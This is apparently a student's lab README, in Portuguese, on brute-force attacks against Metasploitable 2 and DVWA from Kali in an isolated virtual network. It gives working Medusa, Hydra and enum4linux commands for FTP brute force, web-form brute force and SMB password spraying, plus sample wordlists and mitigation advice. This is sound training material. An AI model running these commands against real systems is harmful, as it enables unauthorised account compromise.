Projeto Prático – Ataques de Força Bruta com Kali Linux, Medusa, Metasploitable 2 e DVWA

Descrição

Este projeto implementa, documenta e demonstra testes práticos de ataques de força bruta utilizando:

Kali Linux

Medusa

Metasploitable 2

DVWA (Damn Vulnerable Web Application)

VirtualBox

Foi criado um ambiente controlado com duas máquinas virtuais (Kali + Metasploitable 2) em rede Host-Only, permitindo a simulação segura de vetores de ataque e boas práticas de defesa.

Objetivos do Projeto

Configurar o ambiente virtual vulnerável
Realizar ataques simulados com Medusa e outras ferramentas
Documentar wordlists, comandos e resultados
Aplicar recomendações de mitigação
Criar um repositório no GitHub com todos os arquivos

Ambiente Utilizado

VirtualBox

Kali Linux (ISO instalada em VM)

Metasploitable 2 (VM pronta)

DVWA rodando dentro do Metasploitable 2

Rede: Host-Only Adapter


1. Ataque de Força Bruta em FTP com Medusa

Comando utilizado:

medusa -h <IP_DO_ALVO> -u <usuario> -P wordlists/passwords.txt -M ftp




2. Automação de Tentativas em Formulário Web (DVWA)

DVWA configurado no nível Low.

Exemplo de teste com Hydra:

hydra -l admin -P wordlists/passwords.txt <IP_DO_ALVO> http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"



3. Password Spraying em SMB + Enumeração de Usuários

Enumeração:

enum4linux -U <IP_DO_ALVO>


Password Spraying:

medusa -h <IP_DO_ALVO> -U wordlists/users.txt -p <senha_padrao> -M smbnt


📄 Wordlists Utilizadas

wordlists/users.txt (exemplo):

admin
user
test


wordlists/passwords.txt (exemplo):

123456
password
admin

Recomendações de Mitigação

Implementar bloqueio de tentativas após falhas repetidas

Usar autenticação multifator (MFA)

Habilitar logs e monitoramento de acesso

Senhas fortes e políticas de complexidade

Desabilitar serviços não utilizados

Aumentar o nível de segurança da DVWA (ou aplicações reais)

Como Eu Entreguei o Projeto

Criei o repositório público no GitHub

Adicionei README.md

Adicionei wordlists e prints

Subi todos os arquivos usando Add File → Upload Files

Enviei o link no botão Entregar Projeto